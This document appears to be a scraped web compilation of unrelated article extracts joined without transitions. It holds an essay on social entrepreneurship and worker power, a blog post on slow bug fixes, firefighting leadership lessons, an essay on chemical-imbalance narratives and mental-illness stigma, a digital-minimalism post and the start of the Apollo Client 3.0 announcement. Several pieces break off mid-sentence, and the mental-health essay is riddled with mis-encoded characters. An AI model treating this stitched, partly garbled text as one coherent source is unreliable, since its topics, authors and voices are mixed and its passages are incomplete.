    </span></a></p><p>Reclaiming entrepreneurship is the first proposal. The central argument is to have entrepreneurship be accountable to <em>the public</em>, versus <em>private shareholders</em>. Today, this is more commonly referred to as “social entrepreneurship,” where the primary goal is to address social, cultural, or environmental issues rather than turning a profit and returning capital to private investors. To this end, a nonprofit structure works best, as nonprofits have no owners and are accountable to the public and the state. <a href="#references" title="reference">¹</a></p><p>The argument for private ownership usually goes something like this – that without the prospect of reaping the capital benefits of said ownership, people wouldn’t be incentivized to innovate and we would lose all the nice things we have. This argument may hold some truth in a developing world, but today, the incredible wealth concentration created by our current system actually stifles innovation. Real wages have stayed stagnant, fewer companies are being started, and only companies whose products promise to deliver outlandish returns of capital are considered viable. <a href="#references" title="reference">²</a> To make matters worse, Black women, America’s most entrepreneurial demographic, only receive 0.0006% of venture capital funding. <a href="#references" title="reference">³</a></p><p>The standard model for entrepreneurship today is to have an idea, receive investment for that idea, then build it, scale it, and finally return the investment by getting acquired or going public. This model is set up to make the founders, executives, and investors fabulously wealthy. There is no nuance nor any regard for side effects; as long as there is a large return on investment, the venture is considered a success. Thus, the spirit of entrepreneurship and innovation has been clouded by capital. Only by removing this perverse incentive structure and reimagining this standard model, can we expect to have innovation return to America.</p><h2 id="reclaiming-work"><a href="#reclaiming-work" aria-label="reclaiming work permalink"></a>Reclaiming Work</h2><div>

  </p></div><p>One thing I find incredibly frustrating is when extremely well-paid, full-time tech workers in Silicon Valley or other tech hubs complain about their salaries. To me, it’s the equivalent of sitting in a fancy restaurant, whining that you didn’t get the same amount of desert as the table sitting next to you, all while people eat garbage in the streets.</p><p>At Google, there exists a large contractor workforce referred to as their “shadow workforce,” a group that outnumbers full-time employees. Most tech companies have contingent labor that makes up for 40-50% of their workforce. <a href="#references" title="reference">⁴</a> This division of the American workforce in the tech industry has created a culture of entitlement at the top and resentment at the bottom. Capitalism requires the wealthy class to own the means of production, so keeping full-time employees (who work on the product) happy is important. However, companies are constantly trying to optimize production, so when a contract workforce can replace production without sacrificing control, companies will outsource this work. As long as we are in a capital-directed system, we can expect the growing trend of contract workers to continue.</p><p>For companies that have increasing contractor workforces, contractors must have a clear path to convert to full-time employees. Contractors who choose not to convert must be paid a higher wage than full-time employees since they aren’t provided benefits. Gig economy workers, like Uber and Lyft drivers, should be given control and flexibility over the jobs they take, the ability to negotiate pay, and a way for workers to collectively bargain and resolve issues with their company. An interesting alternative model for gig workers could be <a href="https://platform.coop/" target="_blank" rel="nofollow">platform co-ops</a>, in which a digital platforms like Uber and Lyft would be owned by the people who depend on and participate in it (the drivers).</p><p>The other proposed solutions in reclaiming work have to do with shifting the power to the working class, reducing income inequality, and improving technological development. These proposals include:</p><ul><li>Giving corporate board seats to democratically elected workers</li><li>Implementing a maximum wage whereby you base the highest-paid wage (typically the CEO) to the lowest-paid wage</li><li>Ensure more equal distribution of stock, or removing stock grants for employees entirely</li><li>Public salary transparency with posted salary bands</li><li>Nationalization of companies with excess profits obtained through rent-seeking, or a combination of lowering prices, increasing R&amp;D spending, increasing wages, and raising taxes</li><li>A strict wealth tax on individuals with a high amount of savings drawing passive income from investments</li><li>Worker control over new technology introduced in the workplace to fit the needs of workers over management</li><li>Software/technical licensing for individuals that comes with a tech version of the Hippocratic oath, with free training and a stipend for higher levels</li><li>A “hiring hall” model that works by a project-by-project basis, instead of being employed at a specific company</li></ul><p>A shocking metaphor for the modern workplace is this idea that workers exist in a system of feudalism, under a complex hierarchy and power structure that intends on making bosses feel like kings and queens. <a href="#references" title="reference">⁵</a> The further we go into late-stage capitalism, the ugliest sides of human history repeat itself. To avoid a further downward spiraling of our most basic freedoms and rights, it is paramount that we take steps to reclaim work for all workers.</p><h2 id="reclaiming-public-services"><a href="#reclaiming-public-services" aria-label="reclaiming public services permalink"></a>Reclaiming Public Services</h2><p>The above tweet by digital researcher and librarian <a href="https://twitter.com/erinroseglass" target="_blank" rel="nofollow">Erin Rose Glass</a> captures succinctly the need for certain industries to be public services rather than owned by private corporations. With software innovation dominating the past decade, we have seen an emergence of surveillance capitalism, where our private data is used to drive engagement and profit. The Internet, which was created based on the principles of free information, decentralized ownership, and open protocols and infrastructure, has been hijacked by private enterprise. <a href="#references" title="reference">⁶</a> We have seen our data analyzed by computational products which aim to predict our behavior, these predictions traded on a new …</p></div></div>

<div id="post-body-8378966868534474355" itemprop="articleBody"><p>
It might seem a reasonable question, but it makes some terrible assumptions:</p><ul>
<li>lines of code = effort</li>
<li>lines of code = value</li>
<li>all lines of code are equal</li>
</ul>

<p>
Why did a fix that seems so simple when looking at the changes made take two days to complete?</p>
<div>
<ul>
<li><b>Because the issue was reported with a vague description of how to recreate it.</b> It took me several hours to get to a reliable reproduction of the item. Some developers would have immediately gone back to the person reporting the problem and required more information before investigating. I try and do as much as I can with the information provided. I know some developers don't like having to fix bugs, and so do whatever they can to get out of it. Claiming there isn't enough is a great way to look like you're trying to help but not have to do anything. I know that reporting errors can be hard, and I'm grateful for anyone who does. I want to show appreciation for error reports by trying to do as much as possible with the information provided before asking for more details.</li>
<li><b>Because the reported issue was related to functionality, I'm not familiar with.</b>&nbsp;The feature it was to do with was something I rarely use and is not something I've ever used in great detail. This meant it took me longer than it might to understand how to use it and the nuances of how it interacts with the software with the bug.</li>
<li><b>Because I took the time to investigate the real cause of the issue, not just looking at the symptoms</b>. If some code is throwing an error, you could just wrap it in a try..catch statement and suppress the error. No error, no problem. Right? Sorry, for me, making the problem invisible isn't the same as fixing it. "Swallowing" an error can easily lead to other unexpected side-effects. I don't want to have to deal with them at a point in the future.</li>
<li><b>Because I investigated if there were other ways of getting to the same problem, not just the reported reproduction steps</b>. One set of reproduction steps can easily make the error appear to be in one place when it may actually be more deep-seated. Finding the exact cause of a problem, and looking at all the ways to get there can provide valuable insights. Insights such as how the code is actually used, where there might be other places with possible (other?) problems that might need addressing, or it may show inconsistencies in the code that mean an error is caused (or handled) in one code path but not another.</li>
<li><b>Because I took the time to verify if there were other parts of the code that might be affected in similar ways</b>. If a mistake led to the bug, the same error could have also been made elsewhere in the code-base. Now's a great time to check.&nbsp;</li>
<li><b>Because when I found the cause of the issue, I looked to find the simplest way of fixing it that would have minimal risk of introducing side-effects</b>. I don't want the quickest possible fix. I want a fix that isn't likely to cause confusion or other problems in the future.</li>
<li><b>Because I tested the change thoroughly and verified that it addressed the problem for all the different code paths that were affected</b>. I don't want to rely on someone else to have to test that what I've done is correct. I don't want a bug to be found in the future and for me to have to come back to this code when I've mentally moved on. Context switching is expensive and frustrating. Having a dedicated tester have to look at the "same" change again is something I want to avoid whenever possible.</li>
</ul>

</div>
<div><p>
I don't like having to fix bugs. Partly because they can feel like the result of a previous failure on my part. The other reason I don't like fixing bugs is that I'd prefer to be working on new things.</p><p>

What's worse than having to fix a bug?<br>
Having to fix the same bug repeatedly.<br>
I take the time to make sure any bug is totally fixed any time it is encountered so that it doesn't need to be faced, investigated, fixed, and tested more than once.</p></div>

As a teenager, I was not aware that the youth instructors applied a very smart mix of fun, training, repetition, and strict commands to transform us from clumsy youngsters to real firefighters. Later, I understood that it wasn’t an easy task. I learned how difficult it is to motivate teenagers and train them when I took over the youth instructor role and slowly got into this business (see picture above of my team of youngsters during a fire extinguisher training). It is a challenge to prepare, train, and guide 11-15 years old boys and girls 4 years long while keeping them motivated until they can finally join the crew of adults who extinguish house fires and rescue cats.</p><h2 id="nothing-is-more-difficult-than-motivating-people">Nothing is more difficult than motivating people</h2><p>One would think that the action of fighting a fire already motivates volunteer firefighters to join the weekly training in the evening, several multi-day courses every year, and take over responsibilities in the organization and, thus, sacrifice their free time.</p><p>I have learned that this is not that easy after I was more involved in the management of the organization and was finally elected as the deputy fire chief of our department after 15 years. It might sound corny, but volunteers don’t follow just because you have a higher rank. You need trust and people have to believe that you can handle an operation. If you give the command to enter a burning house, people will only follow your commands if they trust you (and if it makes sense).</p><p>If you give an order that people have to show up at the training next week, they won’t. They don’t have to. It is not the army, it is not their job, they will find excuses and will slowly fade out from the organization. I have experienced hard times when our crew of active people has shrunk from 50 to 20 people.</p><figure><img src="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/christmastree2_hub9b363f13c5500af6e5d377b5bc450b8_1316400_1500x0_resize_q75_box.JPG" srcset="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/christmastree2_hub9b363f13c5500af6e5d377b5bc450b8_1316400_360x0_resize_q75_box.JPG 360w, https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/christmastree2_hub9b363f13c5500af6e5d377b5bc450b8_1316400_700x0_resize_q75_box.JPG 700w" sizes="(max-width: 37.5em) 360px, (min-width: 700px) 700px"><figcaption><h4>Team of youngsters at a fire extinguisher training during my time as youth instructor</h4></figcaption></figure><h2 id="they-should-be-proud-to-work-for-us">They should be proud to work for us!</h2><p>Engineers work almost voluntarily for you. They earn a lot of money but as they work for you, they are really good I guess ;) and they will find another good job immediately. Thus, money isn’t a motivator for a longer period of time and you have to keep them motivated.
I already heard CEOs say: they should be proud to work for us. In the long run that even doesn’t work for the <a href="https://en.wikipedia.org/wiki/Big_Tech">Big Five</a>, so I assume, it won’t work for you either.</p><p>I figured that the dynamics of engineers and volunteer firefighter teams are very similar, maybe it applies even for all kinds of teams. In this post I have summarized my top five lessons learned from my time in the fire department and how it helped me to shape my leadership style as an engineering manager.</p><h2 id="lesson-1-provide-structure-and-keep-going">Lesson 1: Provide structure and keep going</h2><p>Especially when the motivation in the team is already down, for a lead, it is super hard to keep going. But this is exactly the most important phase and it is crucial to have a lead who does not give up. For a team in this downwards spiral, the most important thing is structure.</p><p>In the fire department, when the team got smaller and smaller due to a lack of motivation, we made a big mistake: We canceled some of the weekly drills as the group of present people was too small to practise bigger operations—or at least that was the excuse. As a result, even more people got bored and dropped out.</p><p>I saw similar situations in engineering teams when the motivation was down. People got more and more passive and they no longer proposed to catch up, to have brainstorming sessions, or to talk with each other to find the best solution for a problem.</p><p>In this situation it is essential to insist on the routine that you have hopefully already established before you experience difficult times. Do not accept cancellation requests for 1:1 sessions, retrospectives, or other regular meetings. In this dangerous situation, as a lead, you are the tower of strength and you can help the team to overcome the situation. It sounds quite easy but in reality it is not. In such situations I was depressed and unmotivated as well.</p><p>Everybody works differently but I think a piece of general advice is to stabilize yourself first. Do something outside of your job that makes you happy. Approach your allies (in private or business) and discuss the situation to be able to digest it faster. After that, support the team and keep the routine going. For the weekly firefighter drills I prepared backup plans in case too few people showed up. It is always good to have backup plans to be prepared and keep the system going. For 1:1s, you can try to bring some variety to it by e.g. <a href="https://jasonevanish.com/2014/05/29/101-questions-to-ask-in-1-on-1s/">asking different and new questions</a>.</p><figure><img src="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/flashover_hue1678e2462bbc6923d1f3f2e59deb1b8_457585_1500x0_resize_q75_box.jpg" srcset="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/flashover_hue1678e2462bbc6923d1f3f2e59deb1b8_457585_360x0_resize_q75_box.jpg 360w, https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/flashover_hue1678e2462bbc6923d1f3f2e59deb1b8_457585_700x0_resize_q75_box.jpg 700w" sizes="(max-width: 37.5em) 360px, (min-width: 700px) 700px"><figcaption><h4>We do regular trainings such as <a href="https://en.wikipedia.org/wiki/Flashover">Flash-over</a> container trainings to be prepared for the real fire</h4></figcaption></figure><h2 id="lesson-2-celebrate-them">Lesson 2: Celebrate them!</h2><p>Celebrate your team and celebrate with the team. I mention it here explicitly because I forgot it too often. Especially as a lead your rhythm is not always synced with the team. It happened regularly to me that during the last phase of a project I was already snowed under with organizational tasks for the next project.</p><p>A simple “thank you” might be enough, or sometimes a big party together with the team is called for. When the team has accomplished something and can move on to the well-deserved resting time, the lead should think about the celebration and how she can thank people. Firefighters sacrifice their free time and join training events while they could spend time with their families, friends, or just enjoy their free time in another way.</p><p>Our fire department is in a higher region in the mountains in Innsbruck in Austria and it happened several times that the team was on duty for several days during natural disasters in winter (snow) and summer (floodings). It is not a big deal to invite over friends and family to a small dinner party in the fire department but you show the appreciation of all the people involved.</p><figure><img src="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/thankyou.JPG" srcset="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/thankyou_huf4ae24ba605289f9976a997829732901_242871_360x0_resize_q75_box.JPG 360w, https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/thankyou_huf4ae24ba605289f9976a997829732901_242871_700x0_resize_q75_box.JPG 700w" sizes="(max-width: 37.5em) 360px, (min-width: 700px) 700px"><figcaption><h4>Saying thank you is crucial, not only because we rely on the younger generation in our fire department.</h4></figcaption></figure><p>Your development team might also run into similar exhausting situations. They do over-hours for several weeks to meet a deadline or just work very hard because they believe in the project. This is not the norm and you should thank them. There are many ways of saying “thank you”, and it can range from thanks you deliver in a 1:1 meeting to a bigger team event activity outside of your daily work environment. For me, it is always important that it is an honest “thank you” and that it is not just two words. Again, they could also spend their time in a different way and also other companies pay their employees, that is not unique to you.</p><h2 id="lesson-3-know-your-people-and-support-their-development">Lesson 3: Know your people and support their development</h2><p>It sounds obvious, but do you know your people? Can you answer the following questions for every team member?</p><ul><li>What are the three biggest strengths of the team member?</li><li>What are the motivational factors of the person?</li><li>What non-job-related interests does this person have?</li></ul><p>In our fire department we need people who take responsibility over the IT system, fire trucks, equipment &amp; tools maintenance, operational uniforms, and a lot of other areas. When entering a burning house you better know that the maintenance of tools and equipment was done in a proper way. It is not sufficient to just distribute the responsibilities, you have to know about the passion of people and if they really want to do it. Furthermore, you have to judge if they can and want to learn everything they need to know to take over a responsibility area.</p><figure><img src="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/abseilen_hu041ad4f09540c8d3b36482d8c3bcbb51_3061870_1500x0_resize_q75_box.jpg" srcset="https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/abseilen_hu041ad4f09540c8d3b36482d8c3bcbb51_3061870_360x0_resize_q75_box.jpg 360w, https://wolfgang.gassler.org/firefighter-experience-impact-on-leadership-style/abseilen_hu041ad4f09540c8d3b36482d8c3bcbb51_3061870_700x0_resize_q75_box.jpg 700w" sizes="(max-width: 37.5em) 360px, (min-width: 700px) 700px"><figcaption><h4>Going beyond personal limits during self-rescue training, abseiling on the wall of a building.</h4></figcaption></figure><p>In a company or team you also find a variety of different tasks that have to be done. Especially in smaller companies you do not have specialists for every single area. This can be a burden but also an opportunity for people to not only do their main job and get bored. Some people like to do other things from time to time and also learn new things.</p><p>A good example is recruiting. Not everybody wants to do it and not everybody is suited for it. You have to know your people and sometimes, also push them a bit to take on new challenges. Some people underestimate themselves very often and think they do not know enough to take on a new challenge. It doesn’t matter if it is about taking the tech lead role of a new project, recruiting, or switching from an individual contributor role to a manager role. When you know people, their skills and interests, you can judge better if they are capable of doing it and you can help or motivate them to find new challenges and develop their skills.</p><h2 id="lesson-4-say-yes">Lesson 4: Say yes!</h2><p>There are tons of leadership articles out there that state saying no is crucial. In a lot of situations that might be true but I disagree with them when it is about company or team culture. Think about yourself and how you feel when approaching somebody with a suggestion and then you get the reply “no” or the more or less equivalent “yes, but…”. I call those phrases motivational killers and using it leads to frustrated team members.</p><p>Saying yes doesn’t mean that you have to accept or like everything. For example, the answer “Yes, that sounds like a feasible idea. How would you implement it?” doesn’t mean that you agreed with it. You can ask more questions and analyze the proposal together with the team member. In the worst case, by answering your questions, the person realizes that there might be some issues with the idea. In the best case, it is worth working on it and there is already a team member who buys in and wants to work on this project.</p><p>I heard a lot of ideas from really young firefighters who proposed new ways of training or super cool training objects like old dry Christmas trees (see image at the beginning of the article). Sometimes, especially with more senior people, a “yes, great idea” as a supporting sign from the lead can be …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>After Jenna discovered</strong> that her boyfriend was cheating on her, she went into an emotional tailspin. She was â€˜crying all the timeâ€™, struggled to attend her university classes, slept a lot and avoided situations she normally enjoyed.</p><p>In recounting her emotional reaction, Jenna stressed to me its unreasonableness. Given that she and her boyfriend hadnâ€™t been dating for long, she felt that she shouldnâ€™t have been so upset. After a month, she decided that something was seriously amiss and that she needed professional help. She recalled her psychiatrist diagnosing depression and telling her the problem might be caused by a chemical imbalance in her brain, for which she was prescribed an antidepressant.</p><p>Jenna found her emotional reactions jarring. They defied her basic assumptions about herself as confident, mature and self-sufficient. She told me she welcomed the diagnosis of a neurobiological disorder, which confirmed her problem was â€˜realâ€™ â€“ brought on by a physiological force external to her volition â€“ and that it showed sheâ€™s not â€˜just a slackerâ€™.</p><p>At the same time, Jenna was careful to distance her experience from that of people who are, in her words, â€˜crazyâ€™ or â€˜nutsâ€™. Their illness means a loss of control and ability to function. By contrast, she sees her problem as a common and minor glitch in neurochemistry. No one, she insisted, should mistake her for the mentally ill.</p><p>Jenna was one of 80 diverse volunteers that a research team at the University of Virginia and I interviewed in Chicago, Baltimore, Boston and two small cities in central Virginia. We wanted to find out how people deal with common forms of psychological distress and challenging circumstances, such as: shyness and nervousness in social situations; underperformance at work or school; struggles after the loss of a significant relationship; and disappointment with how their lives are unfolding. A majority of our interviewees had received some form of psychotherapy and/or been diagnosed with a condition such as depression, social anxiety disorder or attention deficit disorder, and prescribed a psychiatric medication.</p><p>It was striking that many (though not all) at least partly explained their distress in terms of biological causes, particularly a neurochemical imbalance. Yet thinking of their problems in this way was a fraught process. Like Jenna, many interviewees sharply distinguished themselves from the mentally ill and cast the mentally ill in a very negative light. This stigmatising of people with serious mental illness wasnâ€™t based on any first-hand experiences; rather, it was motivated by a desire to protect their own dignity and social standing. To justify the distinction between their own situation and mental illness, our interviewees rejected the idea that they had an â€˜illnessâ€™ as such, detached themselves from any formal diagnosis using statements such as â€˜thatâ€™s what the doctor calls itâ€™ or, in some cases, they avoided seeking medical help altogether.</p><p>For people like Jenna, who embraced a neurobiological explanation for their problems, this created a conundrum, which many of them resolved by creating a separate classification for their own experience â€“ what I have called a â€˜third conditionâ€™. The people we spoke to did not give this â€˜conditionâ€™ a name or explicit meaning. Rather it emerged in the rhetorical space opened up by the way they framed their personal struggle, distinguishing it from mental illness, on the one hand, and normality, on the other.</p><p><strong>Consider the perspective</strong> of another of our interviewees, a young woman Iâ€™ll call Piper, who had been diagnosed with depression. When â€˜you think mental illnessâ€™, according to Piper, â€˜you think schizophrenia and crazy people, and Iâ€™m not crazy, I just get really nervous.â€™ In making this distinction, interviewees like Piper and Jenna not only claimed that they were less impaired than the seriously mentally ill, they also insisted that their experience was categorially different. Piper said of herself that biologically something is just â€˜a little offâ€™. She has â€˜too little or too much or whatever it is that makes you have these issuesâ€™. Distinct from â€˜crazy peopleâ€™, she has control over her mind and her story. All she needs is a little pill. Yet at the same time, her â€˜conditionâ€™ is also different from the mundane challenges that normal people might face. Piper was adamant that her nervousness in social situations is different from ordinary shyness. Her taking of medication is warranted. She has a third condition caused by an â€˜imbalanceâ€™.</p><p>The â€˜crazy peopleâ€™ are shadowy, depersonalised figures â€“ the damaged, uncontrolled â€˜otherâ€™ </p><p>To reconcile their perspective with the fact that they had received a psychiatric diagnosis, many interviewees credited a medical professional or a confidant for suggesting something like this third condition idea to them. Others emphasised the ordinariness of their experience and compared it to the types of routine problems that regular physicians treat. As one interviewee put it, â€˜all you have to do is take a pillâ€™.</p><p>There are echoes here of the messages conveyed in direct-to-consumer advertising for psychiatric medication. Iâ€™ve analysed the content of these adverts and found that distress, as listed in symptoms and portrayed in the patientsâ€™ stories, is often presented as a â€˜real medical conditionâ€™ and yet unlike mental illness. The ads contain no references to psychiatrists or to the diagnostic manual of mental disorders from the American Psychiatric Association (APA), nor use of phrases such as â€˜mental illnessâ€™ or â€˜mental disorderâ€™, and no depictions of those affected as anything but productive and successful citizens. In the words of our interviewees and in the advertising messages, the â€˜crazy peopleâ€™ are shadowy, depersonalised figures â€“ the damaged, uncontrolled â€˜otherâ€™ against whom the implicit comparisons are being drawn.</p><p>The views we encountered in our interviews are consistent with national surveys of public opinion about mental health. Today, with respect to mental health problems, the lay public much more freely endorses biological causes, the seeking of medical help and the use of psychoactive medications than in the past. Their views have converged with the biological perspectives long promoted in public campaigns to reduce the stigma of mental illness. According to the American anti-stigma organisation Bring Change to Mind, for instance: â€˜The fact is, a mental illness is a disorder of the brain â€“ your bodyâ€™s most important organ.â€™ Among anti-stigma researchers and activists, the evolution in public attitudes toward biological psychiatry has been celebrated as a sign that the public has at long last become â€˜literateâ€™, with a â€˜more scientificâ€™ even â€˜sophisticatedâ€™ understanding of mental illness.</p><p>In promoting a biogenetic causal theory, anti-stigma campaigners â€“ as well as psychiatrists, the popular media, and others â€“ hoped to convince people that mental illnesses are â€˜just likeâ€™ other chronic physical ailments, such as â€˜heart disease or diabetesâ€™, to <a href="https://www.psychiatry.org/patients-families/what-is-mental-illness" target="_blank">quote</a> the APA, and could be medically addressed. This approach would, in turn, alleviate mental illness stigma and foster tolerance by reducing the (allegedly common) tendency to hold sufferers responsible for their condition. The result, it was confidently believed, would promote treatment optimism and increased help-seeking.</p><p>But something unexpected happened. The public embrace of neurobiology has not led to a more benevolent orientation toward the mentally ill. Rather, according to an <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4409431/" target="_blank">editorial</a> in the <em>Journal of Psychiatry and Neuroscience</em> in 2015, â€˜well-conducted studies have concluded, almost uniformlyâ€™ that the stigma-reduction strategy of recent decades, informed by â€˜biogenetic attribution of all mental disordersâ€™, has â€˜not only not worked, but also may have worsened public attitudes and behaviour toward those with mental illnessesâ€™. Such studies have shown that the growing endorsement of biological causation has continued to exacerbate the stigmatising of mental illness among the <a href="https://www.cambridge.org/core/journals/the-british-journal-of-psychiatry/article/biogenetic-explanations-and-public-acceptance-of-mental-illness-systematic-review-of-population-studies/E6078EED07031B5828DB84FCDC90657F" target="_blank">general public</a>, <a href="https://pubmed.ncbi.nlm.nih.gov/20493559/" target="_blank">patients</a> and <a href="https://www.pnas.org/content/111/50/17786" target="_blank">professionals</a>.</p><p>What accounts for this paradoxical result?</p><p><strong>I believe that </strong>our interviews reveal a crucial reason. While people accepted a neurobiological explanation for their problems, they struggled against the dehumanising notion that their thoughts, feelings or behaviour were mechanistically <em>caused.</em> Drawing on clinicians, drug ads and the popular media, the caricature of the seriously mentally ill served as a pivotal image by which to contrast and affirm their own control and self-determination. Millions of Americans â€“ and countless others in Western countries â€“ likely find themselves sharing this or a similar perspective.</p><p>The idea that oneâ€™s distress is primarily caused by a neurochemical deficiency that can be corrected by a drug is a fiction</p><p>As I argue in my <a href="https://press.uchicago.edu/ucp/books/book/chicago/C/bo48408677.html" target="_blank">book</a> <em>Chemically Imbalanced</em> (2020), to defeat this othering and reduce stigma, clinical practice needs to move away from biogenetic causal language. Psychiatric research doesnâ€™t support the notion of simple cause and effect in mental health, instead uncovering a far more complex and indeterminate picture of vulnerabilities. There is no evidence to justify the continued promotion of one-dimensional theories such as â€˜chemical imbalanceâ€™. Nor does the beneficial use of psychiatric medicines require it. In fact, their precise mechanism of action and relation to troublesome experience <a href="https://www.frontiersin.org/articles/10.3389/fpsyt.2019.00407/full" target="_blank">remains</a> a mystery. It would be more truthful for mental health professionals and public health campaigns to acknowledge this.</p><p>Itâ€™s true, as interviewees such as Jenna made clear, that patients often find biogenetic language appealing. It provides a way to establish their suffering as both tangible and unfeigned, and it offers a simple account and positive prognosis for their struggles. However, the …</p></div></div></div>

      <section id="page-title">
        
      </section>


<section>
    
    
    <div>
        <p><strong>tl;dr</strong>: Digital minimalism allows me to regain lost control and increases my <a href="https://en.wikipedia.org/wiki/Quality_time">quality time</a> as well as time for hobbies and other interests.</p>
<hr>
<p><strong>What the hell?</strong></p>
<p>In general, people are incredulous when telling them that I do not own a smartphone. Even though a few people understand my intention, they would rarely commit doing the same. Therefore, I think I must explain my motivation behind digital minimalism a bit more precisely.</p>
<p>Not having a smartphone is just the first step for me. I want to avoid digital life as much as possible. If, however, digital life is unavoidable I consequently use open source software only. While this sounds as if I am making it unnecessarily difficult for myself, especially regarding my computer science studies, it is a great relief for me in various ways.</p>
<p>There are different levels of digital minimalism and everyone must find the right dose for themselves. Certainly, my way seems very radical, but small steps are sufficient to feel a change.</p>
<p><strong>You can do without</strong></p>
<p>As mentioned before, I do not own a smartphone. Also no e-book reader, no smart TV, no smart watch and certainly not a fucking smart fridge or anything else that does not need to be smart. I am just using a laptop, a desktop and a <a href="https://en.wikipedia.org/wiki/Dumbphone">dumbphone</a>. That is quite enough.</p>
<p>My laptop runs <a href="https://www.openbsd.org/">OpenBSD</a> and the desktop <a href="https://www.freebsd.org/">FreeBSD</a>. I am cautious to use only minimal programs and do almost everything directly from the terminal to reduce complexity and increase my productivity. The dumbphone is mainly used to be reachable in time critical emergencies.</p>
<p>Neither my work nor my university studies require any additional equipment. Life requires none at all. Hardly anyone used anything smart before the 2000s. It is amazing how smart devices are now almost indispensable for many people.</p>
<p><strong>Finally, control again</strong></p>
<p>Digital minimalism is not only about the devices you use or do not use, it is also the attitude of how you use them. I do not need social media and I also do not need the 387th account on a service where I am not the owner of my own data. If I register somewhere now, I have thought about it thoroughly before. Unfortunately, countless people lose track on how many services they are registered. Try to list all your online accounts yourself. You will probably soon notice that you cannot remember all of them.</p>
<p>Every service that you use online generates personal data that can be exploited. Therefore, I want to have control over my data and data flow.</p>
<p><strong>Get rid of the drug</strong></p>
<p>Over time, I realized how addicted I was. I was not only <a href="https://huhn.dev/decentralization-is-dead-long-live-decentralization/">dependent on the infrastructure of others</a>, but I was really hooked. In every free minute I picked up my smartphone and looked up what news there was in the world. First, I updated my Instagram feed, then Facebook and oh look, I got a new snap! The world was always available to me and I was always available to the world.</p>
<p>Not only have I wasted my time, but I have also lost the ability to concentrate. Constant interruptions caused my attention span to decrease. Besides losing time, I was manipulated by countless actors who wanted to monetize me.</p>
<p><strong>Open your eyes</strong></p>
<p>About 3 years ago, I made a radical break and I do not miss anything. I have closed almost all online accounts and sold all non-essential equipment. Just then I realized how screwed up this society is with its compulsion for self-expression and self-optimization. I never liked the whole nonsense, but I was just too glad to be a spectator.</p>
<p>A lot of people are too afraid that they would miss something if they got rid of social media, <a href="https://www.gwern.net/docs/culture/2010-dobelli.pdf">news</a> and so forth. This differs greatly from my experience. Just as long as you can keep scrolling and updating the feeds, you feel like you might miss something. Believe me, you will lose that fear, when you separate yourself from all of that.</p>
<p>I now enjoy the time when I am on the road and am not constantly available. When I do something with family and friends, they now get my full attention and I do not let myself be distracted by anything. The biggest gain for me personally was to get time for self-reflection. The time at the bus stop is no longer just another chance to satisfy the addiction, but now serves as time to reflect. To think about everything that is going on in my head at that moment.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Today we’re thrilled to announce the <strong>official release of Apollo Client 3.0</strong>! This release is the culmination of 55 betas, 14 release candidates, and hundreds of resolved issues and merged pull requests over the past eleven months. Phew!</p>



<p>To everyone who’s tried out AC3 during this extended beta period, <em>thank you</em>. We couldn’t have reached this milestone without your continued feedback and support. And to everyone who’s been waiting for the official launch, we appreciate your patience. Yes, it really is finally here!</p>



<p><strong>Here’s a recap of what’s new, with links to related documentation:</strong></p>



<ul><li>A single, consolidated <code>@apollo/client</code> package<ul><li>Includes entry points like <code>@apollo/client/utilities</code> for efficient use <em>without</em> the core library</li></ul></li><li>New <code>InMemoryCache</code> APIs:<ul><li><a href="https://www.apollographql.com/docs/react/caching/garbage-collection/#cacheevict" target="_blank" rel="noreferrer noopener">Eviction of objects and fields</a></li><li><a href="https://www.apollographql.com/docs/react/caching/garbage-collection/#cachegc" target="_blank" rel="noreferrer noopener">Garbage collection</a></li><li>Configurable policies for <a href="https://www.apollographql.com/docs/react/caching/cache-configuration/#typepolicy-fields" target="_blank" rel="noreferrer noopener">types</a> and <a href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/">fie</a><a href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/" target="_blank" rel="noreferrer noopener">l</a><a href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/">ds</a></li><li>Pagination helpers</li></ul></li><li>Improved <a href="https://www.apollographql.com/docs/react/local-state/local-state-management/" target="_blank" rel="noreferrer noopener">local state management</a></li><li>Expanded and refined UI reactivity:<ul><li><a href="https://www.apollographql.com/docs/react/local-state/reactive-variables/" target="_blank" rel="noreferrer noopener">Reactive variables</a></li><li>More reliable cache broadcast behavior</li><li>More predictable <code>FetchPolicy</code> enforcement</li></ul></li><li>Extensive internal refactoring</li></ul>



<p>Before diving into some of those features here, I’d like to talk a bit about Apollo Client’s cache-focused design philosophy, which informed just about everything that’s included in this release.</p>



<h2>The purpose of a GraphQL client library</h2>



<p>You can consume GraphQL with anything that makes an HTTP request, such as <code>fetch</code> in the browser or <code>curl</code> on the command line. Whichever tool you use, you get all the classic GraphQL benefits: fetching exactly the data you need, in exactly the shape you need, with a single network request.</p>



<p><em>But.</em> Modern client applications use <strong>caching</strong> extensively to improve performance and user experience. And generic HTTP caching just doesn’t work with GraphQL. Every time you request even slightly different data, your HTTP-cached value is invalidated, making it useless for an application of any complexity.</p>



<p>GraphQL data is inherently, well, <em>graphical</em>. And to support GraphQL data effectively, a cache needs to <em>reflect</em> that graphical structure. HTTP caching can’t do this, but a library like Apollo Client <em>can</em>. In our opinion, this is the most important functionality that a GraphQL client library can provide.</p>



<h3>The client-side data graph</h3>



